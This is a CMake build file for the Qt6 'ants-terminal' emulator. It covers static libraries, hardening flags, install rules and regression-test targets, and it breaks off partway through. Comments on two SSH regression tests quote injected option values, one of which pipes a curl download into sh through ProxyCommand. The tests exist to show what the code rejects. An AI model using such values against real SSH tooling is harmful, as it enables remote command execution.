cmake_minimum_required(VERSION 3.20)
project(ants-terminal VERSION 0.7.80 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)
set(CMAKE_AUTOMOC ON)
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

# Single source of truth for the application version. Consumed by main.cpp
# (setApplicationVersion) and auditdialog.cpp (SARIF driver.version, UI badge).
# Bump in PROJECT() above; every caller picks up the new value on rebuild.
add_compile_definitions(ANTS_VERSION="${PROJECT_VERSION}")

# Default build type if not specified
if(NOT CMAKE_BUILD_TYPE AND NOT CMAKE_CONFIGURATION_TYPES)
    set(CMAKE_BUILD_TYPE Release CACHE STRING "Build type" FORCE)
endif()

# Qt6 version floor. 6.2 is the first LTS that ships the full set of
# components we need (DBus was stabilised in 6.2; Qt6OpenGLWidgets
# reached feature parity there). Building against older Qt6 releases
# (6.0 / 6.1) compiles but silently loses DBus on some distros and
# trips shader-compile edge cases in the OpenGL renderer — without
# this floor a rolling-distro user with an older qt6-base installed
# alongside a newer one could pick up the wrong one.
find_package(Qt6 6.2 REQUIRED COMPONENTS Core Gui Widgets Network OpenGL OpenGLWidgets DBus Test)

# Lua 5.4 (optional — plugin system)
find_package(PkgConfig)
if(PkgConfig_FOUND)
    pkg_check_modules(LUA lua5.4)
endif()
if(NOT LUA_FOUND)
    # Fallback: try FindLua
    find_package(Lua 5.4 QUIET)
    if(LUA_FOUND)
        set(LUA_INCLUDE_DIRS ${LUA_INCLUDE_DIR})
    endif()
endif()

# LayerShellQt (optional — wlr-layer-shell-v1 anchoring for Quake-mode on
# Wayland compositors). Without it, Quake-mode still works via the regular
# Qt toplevel path on Wayland but positioning/always-on-top behaviour is at
# the mercy of the compositor (no wl_shell equivalent of X11's
# _NET_WM_STATE_ABOVE). With it, we anchor to the top edge via
# zwlr_layer_shell_v1 so the dropdown behaves the way X11 users expect.
# Used only in mainwindow.cpp's setupQuakeMode() — guarded behind the
# ANTS_WAYLAND_LAYER_SHELL compile definition.
find_package(LayerShellQt CONFIG QUIET)

# ---------------------------------------------------------------------------
# Build-system infrastructure (ANTS-1217 Phase 1)
# ---------------------------------------------------------------------------
# Three knobs that compound the OOM-cure architecture (one main exe + a
# small number of test bundles) with near-zero risk:
#
#   1. ccache as compiler launcher — re-configures and branch switches no
#      longer recompile already-seen TUs; cc1plus is not invoked at all on
#      a cache hit (zero RSS, zero time). CI runners are stateless so they
#      don't benefit, but the workstation rebuild loop does.
#   2. CMAKE_OPTIMIZE_DEPENDENCIES — when an internal STATIC library's
#      interface (its public headers) didn't change, CMake skips re-linking
#      dependents. Requires CMake ≥ 3.19; project mandates 3.20.
#   3. JOB_POOLS (Ninja only — harmless under Make) — caps concurrent
#      compile + link invocations even if the user passes -j$(nproc).
#      Belt-and-suspenders against future regressions: the architectural
#      fix removes the cause of the OOM, this prevents the consequence.
#      `compile_pool=nproc-2` leaves 2 cores headroom for the OS.
# ---------------------------------------------------------------------------
find_program(CCACHE_PROGRAM ccache)
if(CCACHE_PROGRAM)
    set(CMAKE_CXX_COMPILER_LAUNCHER ${CCACHE_PROGRAM})
    set(CMAKE_C_COMPILER_LAUNCHER   ${CCACHE_PROGRAM})
    message(STATUS "ccache found at ${CCACHE_PROGRAM} — using as compiler launcher")
endif()

set(CMAKE_OPTIMIZE_DEPENDENCIES ON)

include(ProcessorCount)
ProcessorCount(_ANTS_NPROC)
if(_ANTS_NPROC LESS 4)
    set(_ANTS_COMPILE_CAP ${_ANTS_NPROC})
else()
    math(EXPR _ANTS_COMPILE_CAP "${_ANTS_NPROC} - 2")
endif()
set_property(GLOBAL APPEND PROPERTY JOB_POOLS
    compile_pool=${_ANTS_COMPILE_CAP}
    link_pool=2)
set(CMAKE_JOB_POOL_COMPILE compile_pool)
set(CMAKE_JOB_POOL_LINK    link_pool)
message(STATUS "Build job pools: compile=${_ANTS_COMPILE_CAP} link=2 (host nproc=${_ANTS_NPROC})")

# ---------------------------------------------------------------------------
# Shared compile-flag interface (ANTS-1217 Phase 1)
# ---------------------------------------------------------------------------
# INTERFACE library carrying the warning + hardening flag set so every
# consumer (libs + main exe + test bundles) compiles with identical
# flags. Single source of truth — flag drift breaks loudly at PCH-validation
# time rather than silently producing different ABIs across libs/exe.
#
# -Wformat=2 upgrades -Wformat to include non-literal format strings, %n usage,
# and missing-argument diagnostics — catches the same class of bug the audit
# `format_string` rule flags at the regex layer.
#
# -Wshadow=local (not full -Wshadow) catches a local shadowing another local
# — the actual bug class. Full -Wshadow also flags parameter-vs-member name
# collisions which are pervasive Qt convention (`void setData(QByteArray data)`
# style) and would drown the signal.
#
# -Wnull-dereference catches paths where a pointer known-null reaches a
# dereference — often from Qt getters (findChild, parent, qobject_cast).
#
# -Wconversion / -Wsign-conversion are noisy by nature; kept OFF for now to
# avoid drowning real findings. Flip on individually when a quiet pass is
# worth it (see ROADMAP: "Tighten narrowing conversions").
#
# -gsplit-dwarf (Debug only) writes per-TU debug info to .dwo files instead
# of embedding into .o. The linker no longer reads/relocates hundreds of MiB
# of debug strings, cutting linker peak RSS 30–50%. Release builds keep the
# standard format so distro debuginfo packaging is unchanged.
add_library(ants_warnings INTERFACE)
target_compile_options(ants_warnings INTERFACE
    -Wall -Wextra -Wpedantic
    -Wformat=2 -Wformat-security
    -Wshadow=local -Wnull-dereference
    # Security hardening
    -fstack-protector-strong
    -fstack-clash-protection
    -fcf-protection
    $<$<NOT:$<CONFIG:Debug>>:-U_FORTIFY_SOURCE>
    $<$<NOT:$<CONFIG:Debug>>:-D_FORTIFY_SOURCE=3>
    -D_GLIBCXX_ASSERTIONS
    # Smaller debug info on Debug builds → lower linker RSS
    $<$<CONFIG:Debug>:-gsplit-dwarf>
)

# ---------------------------------------------------------------------------
# Source libraries (ANTS-1217 Phase 1)
# ---------------------------------------------------------------------------
# Six mandatory + two conditional STATIC libraries. Each src/*.cpp compiles
# ONCE for the whole build (was: 1× for ants-terminal + N× for tests that
# linked it). The libs declare their Qt link surface PUBLIC so consumers
# (the main exe and future test bundles) inherit transitively.
#
# Layering (PUBLIC = transitive, PRIVATE = lib-internal):
#
#   ants_core_lib    ← config / debuglog / IPC / session / PTY foundations
#   ants_vt_lib      ← parser + grid + widget + themes (depends on core)
#   ants_chrome_lib  ← mainwindow + tabbar + palette (depends on vt)
#   ants_claude_lib  ← Claude Code integration (depends on chrome)
#   ants_audit_lib   ← audit dialog + engine + hygiene (depends on core)
#   ants_dialogs_lib ← settings/about/diff/ssh/etc. (depends on chrome)
#   ants_lua_lib     ← only if LUA_FOUND
#   ants_helper_lib  ← only if ANTS_ENABLE_HELPER_CLI
add_library(ants_core_lib STATIC
    src/config.cpp
    src/debuglog.cpp
    src/clipboardguard.cpp
    src/remotecontrol.cpp
    src/themedstylesheet.cpp
    src/globalshortcutsportal.cpp
    src/dialogshowtracer.cpp
    src/kwinpositiontracker.cpp
    src/sessionmanager.cpp
    src/ptyhandler.cpp
    src/vtstream.cpp
)
target_link_libraries(ants_core_lib
    PUBLIC  Qt6::Core Qt6::Gui Qt6::Widgets Qt6::Network Qt6::DBus util
    PRIVATE ants_warnings)
target_include_directories(ants_core_lib PUBLIC src)
set_target_properties(ants_core_lib PROPERTIES POSITION_INDEPENDENT_CODE ON)

add_library(ants_vt_lib STATIC
    src/vtparser.cpp
    src/terminalgrid.cpp
    src/terminalwidget.cpp
    src/themes.cpp
)
target_link_libraries(ants_vt_lib
    PUBLIC  ants_core_lib Qt6::OpenGL Qt6::OpenGLWidgets
    PRIVATE ants_warnings)
set_target_properties(ants_vt_lib PROPERTIES POSITION_INDEPENDENT_CODE ON)

add_library(ants_chrome_lib STATIC
    src/mainwindow.cpp
    src/titlebar.cpp
    src/coloredtabbar.cpp
    src/commandpalette.cpp
)
target_link_libraries(ants_chrome_lib
    PUBLIC  ants_vt_lib
    PRIVATE ants_warnings)
set_target_properties(ants_chrome_lib PROPERTIES POSITION_INDEPENDENT_CODE ON)
if(LayerShellQt_FOUND)
    target_link_libraries(ants_chrome_lib PRIVATE LayerShellQt::Interface)
    target_compile_definitions(ants_chrome_lib PRIVATE ANTS_WAYLAND_LAYER_SHELL=1)
endif()
# mainwindow.cpp gates Lua-related slots and members on ANTS_LUA_PLUGINS;
# a handful of call sites also reference those symbols unconditionally
# (e.g. rebuildCommandPalette() at line 411). Pre-1217 the define was
# attached to the monolithic ants-terminal target so mainwindow.cpp
# always saw it. Carry the same semantics forward by applying it to
# the chrome lib when LUA_FOUND. mainwindow.cpp cleanup is out of
# Phase 1 scope.
if(LUA_FOUND)
    target_compile_definitions(ants_chrome_lib PUBLIC ANTS_LUA_PLUGINS=1)
endif()

add_library(ants_claude_lib STATIC
    src/claudeintegration.cpp
    src/claudeallowlist.cpp
    src/claudestatuswidgets.cpp
    src/claudetabtracker.cpp
    src/claudetranscript.cpp
    src/claudeprojects.cpp
    src/claudebgtasks.cpp
    src/claudebgtasksdialog.cpp
    src/claudetasklist.cpp
    src/claudetasklistdialog.cpp
)
target_link_libraries(ants_claude_lib
    PUBLIC  ants_chrome_lib
    PRIVATE ants_warnings)
set_target_properties(ants_claude_lib PROPERTIES POSITION_INDEPENDENT_CODE ON)

add_library(ants_audit_lib STATIC
    src/auditdialog.cpp
    src/auditengine.cpp
    src/audithygiene.cpp
    src/featurecoverage.cpp
    src/auditrulequality.cpp
)
target_link_libraries(ants_audit_lib
    PUBLIC  ants_core_lib
    PRIVATE ants_warnings)
set_target_properties(ants_audit_lib PROPERTIES POSITION_INDEPENDENT_CODE ON)

add_library(ants_dialogs_lib STATIC
    src/settingsdialog.cpp
    src/roadmapdialog.cpp
    src/diffviewer.cpp
    src/sshdialog.cpp
    src/aidialog.cpp
    src/aboutdialogs.cpp
    src/toggleswitch.cpp
)
target_link_libraries(ants_dialogs_lib
    PUBLIC  ants_chrome_lib
    PRIVATE ants_warnings)
set_target_properties(ants_dialogs_lib PROPERTIES POSITION_INDEPENDENT_CODE ON)

if(LUA_FOUND)
    add_library(ants_lua_lib STATIC
        src/luaengine.cpp
        src/pluginmanager.cpp
    )
    target_link_libraries(ants_lua_lib
        PUBLIC  ants_core_lib ${LUA_LIBRARIES}
        PRIVATE ants_warnings)
    target_include_directories(ants_lua_lib PUBLIC ${LUA_INCLUDE_DIRS})
    target_compile_definitions(ants_lua_lib PUBLIC ANTS_LUA_PLUGINS=1)
    set_target_properties(ants_lua_lib PROPERTIES POSITION_INDEPENDENT_CODE ON)
    message(STATUS "Lua ${LUA_VERSION} found — plugin system enabled")
else()
    message(STATUS "Lua 5.4 not found — plugin system disabled")
endif()

if(LayerShellQt_FOUND)
    message(STATUS "LayerShellQt found — Wayland-native Quake-mode enabled")
else()
    message(STATUS "LayerShellQt not found — Quake-mode on Wayland falls back to the Qt toplevel path")
endif()

# ---------------------------------------------------------------------------
# Main executable (ANTS-1217 Phase 1)
# ---------------------------------------------------------------------------
# Just main.cpp — every other src/*.cpp is in a STATIC library above and is
# reached transitively through target_link_libraries.
add_executable(ants-terminal src/main.cpp)
target_link_libraries(ants-terminal PRIVATE
    ants_core_lib
    ants_vt_lib
    ants_chrome_lib
    ants_claude_lib
    ants_audit_lib
    ants_dialogs_lib
    $<$<BOOL:${LUA_FOUND}>:ants_lua_lib>
    ants_warnings
)

# Precompile Qt aggregate headers. Qt headers dominate per-TU compile cost
# (~200-300 MiB working set in cc1plus) and are pulled in by nearly every
# .cpp under src/. PCH cuts that 30-50%, which keeps the build under
# RAM+swap on 32 GiB hosts as the source tree grows. Aggregate headers
# (no individual classes) so the PCH stays valid across edits.
target_precompile_headers(ants-terminal PRIVATE
    <QtCore/QtCore>
    <QtGui/QtGui>
    <QtWidgets/QtWidgets>
)

# ANTS-1116 v1 — optional `ants-helper` CLI binary. Default OFF
# until ANTS-1120 measurement validates the token-saving claim.
option(ANTS_ENABLE_HELPER_CLI
    "Build the ants-helper local-subagent CLI binary (ANTS-1116 v1)"
    OFF)
if(ANTS_ENABLE_HELPER_CLI)
    add_library(ants_helper_lib STATIC src/antshelper.cpp)
    target_link_libraries(ants_helper_lib
        PUBLIC  Qt6::Core
        PRIVATE ants_warnings)
    target_include_directories(ants_helper_lib PUBLIC src)
    set_target_properties(ants_helper_lib PROPERTIES POSITION_INDEPENDENT_CODE ON)

    add_executable(ants-helper src/antshelpermain.cpp)
    target_link_libraries(ants-helper PRIVATE ants_helper_lib ants_warnings)
endif()

# Sanitizer support (development builds). Applied via the shared
# ants_warnings INTERFACE so every lib + the main exe pick it up
# consistently. The link side still attaches to the executable directly
# because INTERFACE link options on a chain of STATIC libs only reach
# the final consumer.
option(ANTS_SANITIZERS "Enable ASan+UBSan for debugging" OFF)
if(ANTS_SANITIZERS)
    target_compile_options(ants_warnings INTERFACE
        -fsanitize=address,undefined -fno-omit-frame-pointer)
    # Match link option to compile option: every consumer of ants_warnings
    # (main exe + test bundles) needs the sanitizer runtime libs pulled in
    # by the linker, otherwise STATIC-lib .o files instrumented with
    # __asan_*/__ubsan_* calls fail to link with "undefined reference".
    # Pre-1217 ANTS_SANITIZERS predated the STATIC-lib refactor; the
    # global add_compile_options/add_link_options handled this implicitly.
    target_link_options(ants_warnings INTERFACE
        -fsanitize=address,undefined)
endif()
target_link_options(ants-terminal PRIVATE
    -Wl,-z,relro
    -Wl,-z,now
    -Wl,-z,noexecstack
)
set_target_properties(ants-terminal PROPERTIES POSITION_INDEPENDENT_CODE ON)

include(GNUInstallDirs)

install(TARGETS ants-terminal RUNTIME DESTINATION ${CMAKE_INSTALL_BINDIR})

# ---------------------------------------------------------------------------
# Desktop integration — freedesktop.org spec + AppStream metainfo
# ---------------------------------------------------------------------------
# Reverse-DNS naming (org.ants.Terminal) is what AppStream and .desktop both
# expect — `launchable` in the metainfo ties the two files together by the
# shared stem. Installed under share/ so distro packagers can override with
# DESTDIR for split-staging builds.
install(FILES packaging/linux/org.ants.Terminal.desktop
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/applications)

install(FILES packaging/linux/org.ants.Terminal.metainfo.xml
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/metainfo)

# Hicolor icon theme — six sizes. Install each under the matching
# <size>x<size>/apps/ subdir and RENAME to the generic `ants-terminal.png`
# so the .desktop `Icon=ants-terminal` lookup resolves via the standard
# icon-theme index at runtime.
foreach(_sz IN ITEMS 16 32 48 64 128 256)
    install(FILES assets/ants-terminal-${_sz}.png
            DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/icons/hicolor/${_sz}x${_sz}/apps
            RENAME ants-terminal.png)
endforeach()

# Man page (section 1 — user commands). Source-of-truth groff lives under
# packaging/linux/; CMake places it at the GNU-standard mandir. man-db /
# mandoc / less-via-man pick it up automatically once the install root is
# on MANPATH (true for /usr and /usr/local out of the box).
install(FILES packaging/linux/ants-terminal.1
        DESTINATION ${CMAKE_INSTALL_MANDIR}/man1)

# Shell completions (bash / zsh / fish). Hand-written for the current
# QCommandLineParser surface (-h/-v/--quake/--dropdown/--new-plugin); each
# file is installed to the conventional vendor location for its shell so
# distro packages don't have to relocate them:
#   bash → ${datarootdir}/bash-completion/completions/ants-terminal
#   zsh  → ${datarootdir}/zsh/site-functions/_ants-terminal
#   fish → ${datarootdir}/fish/vendor_completions.d/ants-terminal.fish
# All three are auto-discovered without requiring the user to source
# anything by hand.
install(FILES packaging/completions/ants-terminal.bash
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/bash-completion/completions
        RENAME ants-terminal)
install(FILES packaging/completions/_ants-terminal
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/zsh/site-functions)
install(FILES packaging/completions/ants-terminal.fish
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/fish/vendor_completions.d)

# OSC 133 shell-integration hook scripts (0.7.0). HMAC-signed shell hooks
# the user sources from ~/.bashrc / ~/.zshrc to authenticate OSC 133
# markers against the verifier in TerminalGrid. See
# packaging/shell-integration/README.md for setup + threat model. Sourced
# manually by the user (not auto-loaded) so they can opt in per shell
# per machine — the verifier is silent unless $ANTS_OSC133_KEY is set.
install(FILES packaging/shell-integration/ants-osc133.bash
              packaging/shell-integration/ants-osc133.zsh
              packaging/shell-integration/README.md
        DESTINATION ${CMAKE_INSTALL_DATAROOTDIR}/ants-terminal/shell-integration)

# ---------------------------------------------------------------------------
# Tests — audit rule fixtures (ctest)
# ---------------------------------------------------------------------------
# Shell-based harness that runs each audit grep pattern against a small
# fixture tree and asserts the expected match counts. Keeps the rule
# regexes in sync with src/auditdialog.cpp; CI runs `ctest` after the
# build to catch drift.
#
# Default OFF since 2026-05-09: each tests/features/<dir>/test_*.cpp is
# its own add_executable with its own Qt MOC autogen + link step. With
# 141 test targets, a default `cmake --build build` peaks above
# RAM+swap on 32 GiB hosts and trips earlyoom (mid-build kills lose the
# main exe link). CI and packaging pass `-DANTS_TESTS=ON` explicitly;
# local dev opts in via reconfigure or a separate build-tests/ tree.
option(ANTS_TESTS "Build tests (includes audit rule regression tests)" OFF)
if(ANTS_TESTS)
    enable_testing()

    # ---- ANTS-1217 Phase 2 — GoogleTest plumbing ----
    # System pkg first (Tumbleweed gtest-devel, Ubuntu 24.04 libgtest-dev).
    # Floor 1.13 — DISCOVERY_MODE PRE_TEST semantics.
    # FetchContent fallback only fires on hosts without a usable system pkg.
    find_package(GTest 1.13 QUIET)
    if(NOT GTest_FOUND)
        message(STATUS "System GTest >=1.13 not found — falling back to FetchContent v1.15.2")
        include(FetchContent)
        FetchContent_Declare(googletest
            GIT_REPOSITORY https://github.com/google/googletest.git
            GIT_TAG        v1.15.2)
        set(BUILD_GMOCK    OFF CACHE BOOL "" FORCE)
        set(INSTALL_GTEST  OFF CACHE BOOL "" FORCE)
        FetchContent_MakeAvailable(googletest)
    else()
        message(STATUS "GTest ${GTest_VERSION} found — using system package")
    endif()
    include(GoogleTest)

    # GUI bundle helper — bundles share PCH from ants-terminal so the per-TU
    # Qt cost only pays once across the whole tests-on build. The Qt6::Widgets
    # link surface comes through transitively from each ants_*_lib (PUBLIC).
    function(ants_add_gui_bundle name)
        cmake_parse_arguments(B "" "" "LIBS;SOURCES" ${ARGN})
        add_executable(${name} tests/bundle_main_gui.cpp ${B_SOURCES})
        target_link_libraries(${name} PRIVATE
            ${B_LIBS} ants_warnings GTest::gtest)
        target_precompile_headers(${name} REUSE_FROM ants-terminal)
        gtest_discover_tests(${name}
            DISCOVERY_MODE PRE_TEST
            PROPERTIES LABELS "features;fast" TIMEOUT 10)
    endfunction()

    # Core-only bundle helper — Qt::Core only, no Widgets. PCH not reused
    # from ants-terminal (different INTERFACE flag set without Widgets).
    function(ants_add_core_bundle name)
        cmake_parse_arguments(B "" "" "LIBS;SOURCES" ${ARGN})
        add_executable(${name} tests/bundle_main_core.cpp ${B_SOURCES})
        target_link_libraries(${name} PRIVATE
            ${B_LIBS} ants_warnings GTest::gtest Qt6::Core)
        gtest_discover_tests(${name}
            DISCOVERY_MODE PRE_TEST
            PROPERTIES LABELS "features;fast" TIMEOUT 10)
    endfunction()

    add_test(NAME audit_rule_fixtures
             COMMAND bash ${CMAKE_SOURCE_DIR}/tests/audit_self_test.sh)
    set_tests_properties(audit_rule_fixtures PROPERTIES
        LABELS "audit;fast"
        TIMEOUT 30)

    # claude_status_bar — asserts the Claude Code status-bar contract:
    # transcript → ClaudeState mapping covers every documented last-event
    # variant, setShellPid clears stale state on tab-switch, and
    # contextUpdated fires with the right percent derived from
    # usage.input_tokens. See tests/features/claude_status_bar/spec.md.
    # Needs Qt6::Network because ClaudeIntegration's MCP server hooks pull
    # in QLocalSocket/QLocalServer which chain through Network.
    add_executable(test_claude_status_bar
        tests/features/claude_status_bar/test_claude_status.cpp
        src/claudeintegration.cpp
    )
    target_link_libraries(test_claude_status_bar PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Network
        Qt6::Test
    )
    target_include_directories(test_claude_status_bar PRIVATE src)
    target_compile_options(test_claude_status_bar PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME claude_status_bar COMMAND test_claude_status_bar)
    set_tests_properties(claude_status_bar PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_status_bar_per_tab — ANTS-1161 regression. The hook server
    # is one UDS shared by every Claude under any tab, so a sibling
    # tab's PreToolUse used to clobber the singleton's m_state and
    # paint that tab's tool name on the focused tab's bottom Claude:
    # <state> widget. The gate in processHookEvent now drops events
    # whose session_id doesn't match m_transcriptPath's basename. See
    # tests/features/claude_status_bar_per_tab/spec.md.
    add_executable(test_claude_status_bar_per_tab
        tests/features/claude_status_bar_per_tab/test_claude_status_bar_per_tab.cpp
        src/claudeintegration.cpp
    )
    target_link_libraries(test_claude_status_bar_per_tab PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Network
        Qt6::Test
    )
    target_include_directories(test_claude_status_bar_per_tab PRIVATE src)
    target_compile_options(test_claude_status_bar_per_tab PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME claude_status_bar_per_tab COMMAND test_claude_status_bar_per_tab)
    set_tests_properties(claude_status_bar_per_tab PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_plan_mode_detection — asserts that plan-mode toggle events
    # in the JSONL transcript are correctly read (field is `permissionMode`,
    # not `mode`) and that planModeChanged(bool) fires on transition.
    # Anchored to the real Claude Code v2.1.87 JSONL schema. See
    # tests/features/claude_plan_mode_detection/spec.md.
    add_executable(test_claude_plan_mode
        tests/features/claude_plan_mode_detection/test_claude_plan_mode.cpp
        src/claudeintegration.cpp
    )
    target_link_libraries(test_claude_plan_mode PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Network
        Qt6::Test
    )
    target_include_directories(test_claude_plan_mode PRIVATE src)
    target_compile_options(test_claude_plan_mode PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME claude_plan_mode_detection COMMAND test_claude_plan_mode)
    set_tests_properties(claude_plan_mode_detection PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_tab_status_indicator — asserts that the per-tab Claude
    # activity tracker keeps independent state for N shells, that
    # awaitingInput flags override the transcript-derived state without
    # clobbering it, and that plan-mode latching works on the real
    # tracker (not just the shared parser helper). See
    # tests/features/claude_tab_status_indicator/spec.md.
    add_executable(test_claude_tab_tracker
        tests/features/claude_tab_status_indicator/test_claude_tab_tracker.cpp
        src/claudeintegration.cpp
        src/claudetabtracker.cpp
    )
    target_link_libraries(test_claude_tab_tracker PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Network
        Qt6::Test
    )
    target_include_directories(test_claude_tab_tracker PRIVATE src)
    target_compile_options(test_claude_tab_tracker PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_claude_tab_tracker PRIVATE
        ANTS_SOURCE_DIR="${CMAKE_SOURCE_DIR}"
    )
    add_test(NAME claude_tab_status_indicator COMMAND test_claude_tab_tracker)
    set_tests_properties(claude_tab_status_indicator PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_transcript_robustness — asserts that (INV-1/2) the JSONL
    # tail-window reader grows past events larger than 32 KB without
    # dropping state and returns within the 4 MiB cap on pathological
    # inputs, and that (INV-3..6) decodeProjectPath filesystem-probes to
    # preserve hyphens in leaf and intermediate path segments while
    # keeping legacy hyphen-free paths unchanged. See
    # tests/features/claude_transcript_robustness/spec.md.
    add_executable(test_claude_transcript_robustness
        tests/features/claude_transcript_robustness/test_claude_transcript_robustness.cpp
        src/claudeintegration.cpp
    )
    target_link_libraries(test_claude_transcript_robustness PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Network
        Qt6::Test
    )
    target_include_directories(test_claude_transcript_robustness PRIVATE src)
    target_compile_options(test_claude_transcript_robustness PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME claude_transcript_robustness
             COMMAND test_claude_transcript_robustness)
    set_tests_properties(claude_transcript_robustness PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # allowlist_add — asserts (A) rule normalisation, (B) generalisation
    # across every shell splitter, (C) segment-aware subsumption,
    # (D) hook-path button retraction wiring (toolFinished +
    # sessionStopped on ClaudeIntegration, not only
    # claudePermissionCleared on TerminalWidget), (E)
    # openClaudeAllowlistDialog calls show+raise+activateWindow so the
    # dialog becomes the active window on a frameless parent.
    # See tests/features/allowlist_add/spec.md.
    #
    # §D and §E production bindings grep src/mainwindow.cpp at runtime
    # — SRC_MAINWINDOW_PATH baked in as a compile definition below.
    # §E also does an API-level QDialog+QMainWindow lifecycle check,
    # which needs QApplication + offscreen QPA.
    add_executable(test_allowlist_add
        tests/features/allowlist_add/test_allowlist_add.cpp
        src/claudeallowlist.cpp
        src/debuglog.cpp  # 0.7.12: allowlist logs parse-failure guard via ANTS_LOG
    )
    target_link_libraries(test_allowlist_add PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_allowlist_add PRIVATE src)
    target_compile_options(test_allowlist_add PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_allowlist_add PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_CLAUDESTATUSWIDGETS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudestatuswidgets.cpp"
    )
    add_test(NAME allowlist_add COMMAND test_allowlist_add)
    set_tests_properties(allowlist_add PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10
        ENVIRONMENT "QT_QPA_PLATFORM=offscreen")

    # allowlist_perms_postcommit — asserts Claude allowlist settings file
    # lands 0600 after saveSettings(), covering the QSaveFile-rename edge
    # case on filesystems that don't preserve fd perms across rename
    # (FAT/exFAT, some SMB/NFS servers, Qt copy+unlink fallback).
    # Locks the belt-and-suspenders post-commit setOwnerOnlyPerms call
    # on m_settingsPath in saveSettings(). See
    # tests/features/allowlist_perms_postcommit/spec.md.
    add_executable(test_allowlist_perms_postcommit
        tests/features/allowlist_perms_postcommit/test_allowlist_perms_postcommit.cpp
        src/claudeallowlist.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_allowlist_perms_postcommit PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_allowlist_perms_postcommit PRIVATE src)
    target_compile_options(test_allowlist_perms_postcommit PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_allowlist_perms_postcommit PRIVATE
        SRC_CLAUDEALLOWLIST_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeallowlist.cpp"
    )
    add_test(NAME allowlist_perms_postcommit
             COMMAND test_allowlist_perms_postcommit)
    set_tests_properties(allowlist_perms_postcommit PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10
        ENVIRONMENT "QT_QPA_PLATFORM=offscreen")

    # session_persistence_default — locks in the 0.6.43 fix that flipped
    # Config::sessionPersistence()'s default from false → true. Pre-fix,
    # fresh users (no `session_persistence` key in config.json) silently
    # had tabs discarded on exit. Exercises Config's public API directly
    # against an isolated XDG_CONFIG_HOME, asserting the full truth table
    # {missing, false, true} → {true, false, true}. See
    # tests/features/session_persistence_default/spec.md.
    add_executable(test_session_persistence_default
        tests/features/session_persistence_default/test_session_persistence_default.cpp
        src/config.cpp
        src/debuglog.cpp  # 0.7.12: config.cpp logs load/save failures via ANTS_LOG
    )
    target_link_libraries(test_session_persistence_default PRIVATE
        Qt6::Core
    )
    target_include_directories(test_session_persistence_default PRIVATE src)
    target_compile_options(test_session_persistence_default PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME session_persistence_default
             COMMAND test_session_persistence_default)
    set_tests_properties(session_persistence_default PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # ssh_dash_host_rejected — regression guard for the 0.7.7 CVE-2017-
    # 1000117-class fix. SshBookmark::toSshCommand must emit `--` before
    # the host argument, so OpenSSH will never parse a host value that
    # begins with `-` as an option (e.g. -oProxyCommand=bash -c 'evil').
    # Shell-quoting alone does not defend against this — the shell passes
    # the value correctly but ssh itself re-parses the leading dash.
    add_executable(test_ssh_dash_host_rejected
        tests/features/ssh_dash_host_rejected/test_ssh_dash.cpp
        src/sshdialog.cpp
    )
    target_link_libraries(test_ssh_dash_host_rejected PRIVATE
        Qt6::Core
        Qt6::Widgets
    )
    target_include_directories(test_ssh_dash_host_rejected PRIVATE src)
    target_compile_options(test_ssh_dash_host_rejected PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME ssh_dash_host_rejected COMMAND test_ssh_dash_host_rejected)
    set_tests_properties(ssh_dash_host_rejected PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # ssh_extra_args_sanitize — asserts the 0.7.12 /indie-review fix that
    # rejects ProxyCommand/LocalCommand/PermitLocalCommand from extraArgs.
    # Without this filter a bookmark field carrying
    # `-oProxyCommand=curl evil.sh|sh` hands OpenSSH an attacker-chosen
    # shell command (executed via /bin/sh -c). See
    # tests/features/ssh_extra_args_sanitize/spec.md.
    add_executable(test_ssh_extra_args_sanitize
        tests/features/ssh_extra_args_sanitize/test_ssh_extra_args.cpp
        src/sshdialog.cpp
    )
    target_link_libraries(test_ssh_extra_args_sanitize PRIVATE
        Qt6::Core
        Qt6::Widgets
    )
    target_include_directories(test_ssh_extra_args_sanitize PRIVATE src)
    target_compile_options(test_ssh_extra_args_sanitize PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME ssh_extra_args_sanitize COMMAND test_ssh_extra_args_sanitize)
    set_tests_properties(ssh_extra_args_sanitize PROPERTIES
        LABELS "features;fast"
